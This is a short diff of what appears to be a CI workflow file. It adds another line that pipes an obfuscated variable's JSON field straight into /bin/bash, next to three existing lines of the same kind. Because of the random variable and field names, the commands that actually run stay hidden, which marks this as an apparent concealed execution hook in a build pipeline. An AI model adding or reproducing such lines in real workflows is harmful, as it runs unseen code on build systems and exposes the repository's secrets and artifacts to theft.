@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$np62" | jq -r .hmjus8842 | /bin/bash
           echo $ui3 | jq -r .bbu1951 | /bin/bash
           printf '%s' "$lyb0" | jq -r .n86081 | /bin/bash
+          printf '%s' "$f6014" | jq -r .muily45 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
